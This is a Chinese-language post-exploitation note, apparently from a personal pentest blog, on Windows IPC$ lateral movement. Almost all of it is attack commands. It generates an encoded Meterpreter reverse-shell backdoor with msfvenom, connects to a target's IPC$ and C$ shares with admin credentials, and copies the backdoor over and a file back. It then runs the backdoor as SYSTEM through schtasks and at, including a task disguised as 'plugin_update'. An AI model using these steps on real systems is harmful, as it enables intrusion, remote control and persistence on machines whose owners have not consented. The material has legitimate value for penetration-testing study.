---
title: IPC Basic Operation
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - PostExploit
date: 2020-12-07 17:55:00
top:
updated:
tags:
layout:
---

## IPC$(Internet Process Connection)是共享"命名管道"的资源。

它是为了让进程间通信而开放的命名管道，
通过提供可信任的用户名和口令，
连接双方可以建立安全的通道并以此通道进行加密数据的交换，
从而实现对远程计算机的访问。

使用条件：
* 开放了139、445端口；
* 目标开启ipc$文件共享；
* 获取用户账号密码。

### msfvenom生成后门

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.79.207 LPORT=4444 -f exe > ./test.exe
```

### 与目标建立ipc$连接

```zsh
#建立ipc连接
net use \\10.211.55.9\ipc$ /u:adminstrator <password>

#查看已建立的连接
net use

#挂载目标c盘到本地，盘符为z
net use z:  \\10.211.55.9\c$   

#查看目标网路共享的资源
net view \\10.211.55.9
```

### 拷贝test.exe到目标网络

```
#拷贝本地文件到目标C:\windows\temp\中
copy test.exe \\10.211.55.9\c$\windows\temp\

#下载目录C:\windows\temp\hash.txt文件到本地
copy \\10.211.55.9\c$\windows\temp\aaa.txt
```

### 4.启用计划任务执行

##### 使用schtasks.exe命令

```
#在目标上创建计划任务task_name1
schtasks /create /tn task_name1 /s 10.211.55.9  /u administrator /p <password> /tr c:\windows\temp\test.exe /sc onstart /ru system

#执行目标上的计划任务task_name1
schtasks /run /s 10.211.55.9 /u administrator /p <password> /tn task_name1

# 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update
schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p "1qaz@WSX"

#删除目标上的计划任务task_name1
schtasks /delete /s 10.211.55.9 /u administrator /p <password>  /tn task_name1  /f
```

##### 使用at命令

```
#查看目标上的时间
net time \\10.211.55.9

#设定目标上的定时执行的任务
at \\10.211.55.9 13:54 c:\windows\temp
test.exe

#删除目标上的定时任务
at \\10.211.55.9
at \\10.211.55.9 <id> /del
```